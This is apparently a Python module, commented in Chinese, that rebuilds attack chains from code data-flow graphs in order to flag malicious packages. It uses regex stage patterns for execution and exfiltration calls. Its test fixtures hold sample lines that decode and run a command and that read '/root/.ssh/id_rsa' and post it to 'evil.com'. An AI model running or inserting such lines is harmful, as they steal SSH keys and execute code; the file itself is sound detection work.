"""
攻击链重建器 - 从DDG数据中重建完整的攻击链

功能：
1. 追踪数据流路径，重建攻击的完整过程
2. 识别攻击的阶段（数据引入、处理、执行、外传）
3. 计算攻击链的完整性和置信度
4. 生成可读的攻击链报告

设计原则：
- 基于DDG的结构化数据
- 支持跨文件的数据流追踪
- 提供可解释的攻击链

修复记录（集成到 batch_solution_b_v2.py 主流程时修正）：
- 阶段遮蔽：原实现按字典序 first-match 分配阶段，requests.post/urlopen
  永远归入 data_inflow，exfiltration 阶段基本检不出。现改为按
  STAGE_PRIORITY 分配，且 data_inflow/exfiltration 的网络模式分离
  （get/urlopen=引入，post/put/socket.send=外传）。
- 前驱查找：原来对每个节点全图线性扫描（O(V×E)），现预建反向邻接表。
- 完整性口径：原来用"全包出现的阶段数"，现用"链上实际覆盖的阶段"。
- 置信度：去掉与证据脱钩的 0.8 固定分，改为链阶段覆盖/长度/跨文件。
- 链详情：node_map 原来只含已分阶段节点，中间节点被丢弃导致链断裂，
  现使用全量节点表。
"""

import re
from typing import Dict, List, Optional, Tuple
from collections import defaultdict, deque


class AttackChainRebuilder:
    """攻击链重建器"""

    # 性能上限（2026-10，真实大包测试驱动）：对 3000+ 节点、上千危险节点的
    # 包，逐节点全图 BFS + 路径列表复制会退化到分钟级/小时级。
    MAX_FOCUS_NODES = 100        # 只对前 N 个危险节点重建链
    MAX_VISITED_PER_CHAIN = 2000  # 单条链的反向展开上限

    # 攻击阶段定义
    ATTACK_STAGES = {
        'data_inflow': {
            'name': '数据引入',
            'patterns': [
                r'import\s+\w+',
                r'from\s+\w+\s+import',
                r'requests\.(get|head)\s*\(',
                r'urllib\.request\.urlopen\s*\(',
                r'open\s*\(',
            ],
            'description': '从外部引入数据（网络请求、文件读取、模块导入）'
        },
        'data_processing': {
            'name': '数据处理',
            'patterns': [
                r'\.decode\s*\(',
                r'\.encode\s*\(',
                r'base64\.',
                r'binascii\.',
                r'str\.\w+\s*\(',
                r'bytes\.\w+\s*\(',
                r'[\^&|]\s*=',  # 位运算（去掉原 .* 前缀：re.search 本就全文搜索，
                                # 而 .* 在长源码上会引发 O(n²) 回溯，实测卡死）
            ],
            'description': '对数据进行处理（编码解码、加密解密、格式转换）'
        },
        'dangerous_execution': {
            'name': '危险执行',
            'patterns': [
                r'eval\s*\(',
                r'exec\s*\(',
                r'compile\s*\(',
                r'os\.system\s*\(',
                r'os\.popen\s*\(',
                r'subprocess\.(Popen|call|run)\s*\(',
            ],
            'description': '执行危险操作（代码执行、命令注入）'
        },
        'exfiltration': {
            'name': '数据外传',
            'patterns': [
                r'requests\.(post|put)\s*\(',
                r'socket\.(connect|send|sendall)\s*\(',
                r'smtplib\.SMTP',
            ],
            'description': '将数据发送到外部服务器'
        },
    }

    # 一个节点可能同时匹配多个阶段（如 eval(base64.b64decode(x)) 同时命中
    # 数据处理与危险执行），按此优先级分配唯一阶段：列表前面的优先，
    # 攻击链下游（危险执行 > 数据外传）比上游（数据引入）优先
    STAGE_PRIORITY = [
        'dangerous_execution',
        'exfiltration',
        'data_processing',
        'data_inflow',
    ]

    def __init__(self):
        """初始化重建器"""
        self.stage_cache = {}
        # 预编译阶段正则；并把匹配文本限制在前 N 字符（长源码既无必要也危险）
        self._compiled_stages = {
            name: [re.compile(p, re.IGNORECASE) for p in info['patterns']]
            for name, info in self.ATTACK_STAGES.items()
        }
        self._match_chars = 2000

    def rebuild(
        self,
        nodes: List[Dict],
        edges: List[Dict],
        focus_nodes: Optional[List[Dict]] = None
    ) -> Dict:
        """
        重建攻击链

        Args:
            nodes: 所有DDG节点（node_id/code/type/line/file）
            edges: 所有DDG边（from_node/to_node，可选 from_file/to_file）
            focus_nodes: 重点关注的危险节点（可选，默认为危险执行+数据外传节点）

        Returns:
            {
                'chains': List[Dict],  # 检测到的攻击链（按阶段覆盖+长度降序，去重）
                'stages': Dict,        # 各阶段的节点
                'completeness': float, # 完整性（0-1）
                'confidence': float,   # 置信度（0-1）
                'summary': str,        # 攻击链摘要
            }
        """
        # 全量节点映射（含未分阶段的中间节点，用于还原链详情）
        node_map = {self._node_key(node): node for node in nodes}

        # 1. 识别各阶段的节点
        stages = self._identify_stages(nodes)

        # 2. 构建数据流图（正向 + 反向邻接表）
        graph, reverse_graph = self._build_graph(nodes, edges)

        # 3. 重建攻击链（从危险执行/数据外传节点回溯）
        if focus_nodes is None:
            focus_nodes = (stages.get('dangerous_execution', [])
                           + stages.get('exfiltration', []))

        # 去重 + 限量：同一节点可能在两个阶段都出现；大包危险节点上千
        seen_ids = set()
        unique_focus = []
        for node in focus_nodes:
            key = self._node_key(node)
            if key and key not in seen_ids:
                seen_ids.add(key)
                unique_focus.append(node)
        if len(unique_focus) > self.MAX_FOCUS_NODES:
            unique_focus = unique_focus[:self.MAX_FOCUS_NODES]

        chains = []
        for node in unique_focus:
            chain = self._rebuild_single_chain(node, graph, reverse_graph,
                                               stages, node_map)
            if chain:
                chains.append(chain)

        # 去重与排序：丢弃节点集合是其他链子集的链，按阶段覆盖+长度降序
        chains = self._deduplicate_chains(chains)

        # 4. 计算完整性和置信度
        completeness = self._calculate_completeness(chains)
        confidence = self._calculate_confidence(chains)

        # 5. 生成摘要
        summary = self._generate_summary(chains, stages)

        return {
            'chains': chains,
            'stages': stages,
            'completeness': round(completeness, 3),
            'confidence': round(confidence, 3),
            'summary': summary,
        }

    @staticmethod
    def _node_key(node: Dict) -> str:
        """节点的唯一标识（兼容缺省）"""
        return node.get('node_id') or f"{node.get('file', '')}_{node.get('line', 0)}"

    def _identify_stages(self, nodes: List[Dict]) -> Dict:
        """识别各阶段的节点（按 STAGE_PRIORITY 分配唯一阶段）"""
        stages = defaultdict(list)

        for node in nodes:
            code = (node.get('code', '') or '')[:self._match_chars]
            node_type = node.get('type', '')

            for stage_name in self.STAGE_PRIORITY:
                if any(p.search(code) for p in self._compiled_stages[stage_name]):
                    stages[stage_name].append({
                        'node_id': self._node_key(node),
                        'code': code,
                        'line': node.get('line', 0),
                        'file': node.get('file', ''),
                        'type': node_type,
                    })
                    break  # 一个节点只属于一个阶段

        return dict(stages)

    def _matches_stage(self, code: str, patterns: List[str]) -> bool:
        """检查代码是否匹配某个阶段"""
        for pattern in patterns:
            if re.search(pattern, code, re.IGNORECASE):
                return True
        return False

    def _build_graph(
        self,
        nodes: List[Dict],
        edges: List[Dict]
    ) -> Tuple[Dict[str, List[str]], Dict[str, List[str]]]:
        """构建数据流图（正向与反向邻接表）"""
        graph = defaultdict(list)
        reverse_graph = defaultdict(list)

        for edge in edges:
            from_id = edge.get('from_node', '')
            to_id = edge.get('to_node', '')

            if from_id and to_id:
                graph[from_id].append(to_id)
                reverse_graph[to_id].append(from_id)

        return dict(graph), dict(reverse_graph)

    def _rebuild_single_chain(
        self,
        start_node: Dict,
        graph: Dict[str, List[str]],
        reverse_graph: Dict[str, List[str]],
        stages: Dict,
        node_map: Dict[str, Dict]
    ) -> Optional[Dict]:
        """
        重建单个攻击链（BFS回溯）

        从危险执行/数据外传节点开始，回溯到数据引入点
        """
        start_id = self._node_key(start_node)
        if not start_id:
            return None

        inflow_ids = {n['node_id'] for n in stages.get('data_inflow', [])}

        # BFS 回溯（父指针记录，避免每步复制整条路径 -> O(path²)）
        parents = {start_id: None}
        queue = deque([start_id])
        found = None
        expanded = 0

        while queue:
            node_id = queue.popleft()
            if node_id in inflow_ids:
                found = node_id
                break  # BFS 首次命中即最短路径，更精确也更省
            for pred_id in reverse_graph.get(node_id, []):
                if pred_id not in parents:
                    parents[pred_id] = node_id
                    queue.append(pred_id)
            expanded += 1
            if expanded >= self.MAX_VISITED_PER_CHAIN:
                break

        if found is None:
            return None

        # 从数据引入点回溯到起点
        path = []
        cur = found
        while cur is not None:
            path.append(cur)
            cur = parents[cur]
        path.reverse()

        # 构建攻击链详情（含未分阶段的中间节点）
        return self._build_chain_detail(path, stages, node_map)

    def _build_chain_detail(
        self,
        chain_ids: List[str],
        stages: Dict,
        node_map: Dict[str, Dict]
    ) -> Dict:
        """构建攻击链详情"""
        # 阶段查表：node_id -> stage
        stage_lookup = {}
        for stage_name, stage_nodes in stages.items():
            for node in stage_nodes:
                stage_lookup[node['node_id']] = stage_name

        steps = []
        for i, node_id in enumerate(chain_ids):
            node = node_map.get(node_id, {})

            steps.append({
                'step': i + 1,
                'node_id': node_id,
                'code': (node.get('code', '') or '')[:100],  # 限制长度
                'line': node.get('line', 0),
                'file': node.get('file', ''),
                'stage': stage_lookup.get(node_id, 'unknown'),
            })

        covered = {s['stage'] for s in steps} - {'unknown'}

        return {
            'steps': steps,
            'length': len(steps),
            'stages_covered': len(covered),
            'covered_stages': sorted(covered),
            'node_ids': list(chain_ids),
        }

    def _deduplicate_chains(self, chains: List[Dict]) -> List[Dict]:
        """去重：节点集合是其他链子集的链丢弃；按阶段覆盖+长度降序"""
        if not chains:
            return []

        chains = sorted(
            chains,
            key=lambda c: (c.get('stages_covered', 0), c.get('length', 0)),
            reverse=True
        )

        kept = []
        kept_id_sets = []
        for chain in chains:
            id_set = set(chain.get('node_ids', []))
            if any(id_set <= existing for existing in kept_id_sets):
                continue
            kept.append(chain)
            kept_id_sets.append(id_set)
        return kept

    def _calculate_completeness(self, chains: List[Dict]) -> float:
        """
        计算攻击链完整性（0-1）

        完整性指标：
        - 链上实际覆盖的攻击阶段比例（而非全包出现的阶段）
        - 最长攻击链长度（假设5步为完整攻击链）
        - 跨文件数据流（加分）
        """
        if not chains:
            return 0.0

        # 1. 阶段覆盖度（链上实际出现的阶段）
        total_stages = len(self.ATTACK_STAGES)
        covered_stages = set()
        for chain in chains:
            covered_stages.update(chain.get('covered_stages', []))
        stage_score = len(covered_stages) / max(total_stages, 1)

        # 2. 最长攻击链长度
        max_length = max((chain.get('length', 0) for chain in chains), default=0)
        length_score = min(max_length / 5, 1.0)

        # 3. 跨文件攻击链（加分）
        has_cross_file = any(
            len(set(step.get('file', '') for step in chain.get('steps', []))) > 1
            for chain in chains
        )
        cross_file_score = 0.2 if has_cross_file else 0.0

        # 综合评分
        completeness = (stage_score * 0.5) + (length_score * 0.3) + cross_file_score

        return min(completeness, 1.0)

    def _calculate_confidence(self, chains: List[Dict]) -> float:
        """
        计算置信度（0-1）

        置信度指标：
        - 各链平均阶段覆盖率
        - 最长链长度
        - 跨文件链的存在
        """
        if not chains:
            return 0.0

        total_stages = max(len(self.ATTACK_STAGES), 1)
        avg_stage_ratio = sum(
            chain.get('stages_covered', 0) / total_stages
            for chain in chains
        ) / len(chains)

        max_length = max((chain.get('length', 0) for chain in chains), default=0)
        length_score = min(max_length / 5, 1.0)

        has_cross_file = any(
            len(set(step.get('file', '') for step in chain.get('steps', []))) > 1
            for chain in chains
        )
        cross_file_score = 0.2 if has_cross_file else 0.0

        confidence = (avg_stage_ratio * 0.4) + (length_score * 0.4) + cross_file_score

        return min(confidence, 1.0)

    def _generate_summary(
        self,
        chains: List[Dict],
        stages: Dict
    ) -> str:
        """生成攻击链摘要"""
        parts = []

        # 检测到的攻击链数量
        parts.append(f"检测到{len(chains)}条攻击链")

        # 各阶段统计
        stage_counts = {
            stage_name: len(nodes)
            for stage_name, nodes in stages.items()
        }

        # 数据引入
        if 'data_inflow' in stage_counts:
            parts.append(f"{stage_counts['data_inflow']}个数据引入点")

        # 数据处理
        if 'data_processing' in stage_counts:
            parts.append(f"{stage_counts['data_processing']}个数据处理操作")

        # 危险执行
        if 'dangerous_execution' in stage_counts:
            parts.append(f"{stage_counts['dangerous_execution']}个危险执行点")

        # 数据外传
        if 'exfiltration' in stage_counts:
            parts.append(f"{stage_counts['exfiltration']}个数据外传操作")

        return "、".join(parts)

    def visualize_chain(self, chain: Dict) -> str:
        """可视化攻击链（文本形式）"""
        lines = []
        lines.append("Attack Chain Visualization:")
        lines.append("=" * 60)

        for step in chain.get('steps', []):
            stage = step.get('stage', 'unknown')
            code = step.get('code', '')
            line = step.get('line', 0)

            # 阶段图标（ASCII字符）
            stage_icons = {
                'data_inflow': '[IN]',
                'data_processing': '[PROC]',
                'dangerous_execution': '[EXEC]',
                'exfiltration': '[OUT]',
            }
            icon = stage_icons.get(stage, '[UNK]')

            lines.append(f"{icon} Line {line}: {code}")

        lines.append("=" * 60)
        return "\n".join(lines)


def test_rebuilder():
    """测试攻击链重建器"""
    rebuilder = AttackChainRebuilder()

    # 测试用例1：下载 -> 解码 -> 执行（含未分阶段的中间节点）
    nodes = [
        {'node_id': '1', 'code': 'import base64', 'type': 'import', 'line': 1, 'file': 'a.py'},
        {'node_id': '2', 'code': 'import os', 'type': 'import', 'line': 2, 'file': 'a.py'},
        {'node_id': '3', 'code': 'encoded = get_data()', 'type': 'assignment', 'line': 3, 'file': 'a.py'},
        {'node_id': '4', 'code': 'decoded = base64.b64decode(encoded)', 'type': 'assignment', 'line': 4, 'file': 'a.py'},
        {'node_id': '5', 'code': 'os.system(decoded)', 'type': 'statement', 'line': 5, 'file': 'a.py'},
    ]

    edges = [
        {'from_node': '1', 'to_node': '4', 'variable': 'base64'},
        {'from_node': '3', 'to_node': '4', 'variable': 'encoded'},
        {'from_node': '4', 'to_node': '5', 'variable': 'decoded'},
    ]

    # 聚焦危险执行节点
    focus_nodes = [
        {'node_id': '5', 'code': 'os.system(decoded)', 'type': 'statement', 'line': 5}
    ]

    result = rebuilder.rebuild(nodes, edges, focus_nodes)

    print("测试1（下载->解码->执行）：")
    print(f"摘要: {result['summary']}")
    print(f"完整性: {result['completeness']}")
    print(f"置信度: {result['confidence']}")
    print(f"检测到{len(result['chains'])}条攻击链")

    assert result['chains'], "测试1失败：应检出攻击链"
    chain = result['chains'][0]
    stages_in_chain = [s['stage'] for s in chain['steps']]
    print(f"链上阶段: {stages_in_chain}")
    assert 'dangerous_execution' in stages_in_chain
    assert 'data_processing' in stages_in_chain
    assert 'data_inflow' in stages_in_chain
    print(rebuilder.visualize_chain(chain))

    # 测试用例2：凭据读取 -> 外传（exfiltration 必须可检出，不被 data_inflow 遮蔽）
    nodes2 = [
        {'node_id': '10', 'code': "f = open('/root/.ssh/id_rsa')", 'type': 'call', 'line': 10, 'file': 'b.py'},
        {'node_id': '11', 'code': 'data = f.read()', 'type': 'assignment', 'line': 11, 'file': 'b.py'},
        {'node_id': '12', 'code': "requests.post('http://evil.com', data=data)", 'type': 'call', 'line': 12, 'file': 'b.py'},
    ]
    edges2 = [
        {'from_node': '10', 'to_node': '11'},
        {'from_node': '11', 'to_node': '12'},
    ]

    result2 = rebuilder.rebuild(nodes2, edges2)
    print("\n测试2（读取凭据->外传，验证 exfiltration 不被遮蔽）：")
    print(f"摘要: {result2['summary']}")
    exfil_stage_nodes = result2['stages'].get('exfiltration', [])
    assert any(n['node_id'] == '12' for n in exfil_stage_nodes), \
        "测试2失败：requests.post 应被识别为 exfiltration 而非 data_inflow"
    assert result2['chains'], "测试2失败：外传链应被重建"
    chain2 = result2['chains'][0]
    stages2 = [s['stage'] for s in chain2['steps']]
    print(f"链上阶段: {stages2}")
    assert 'exfiltration' in stages2 and 'data_inflow' in stages2
    print(rebuilder.visualize_chain(chain2))

    print("\n[OK] 全部测试通过")


if __name__ == '__main__':
    test_rebuilder()
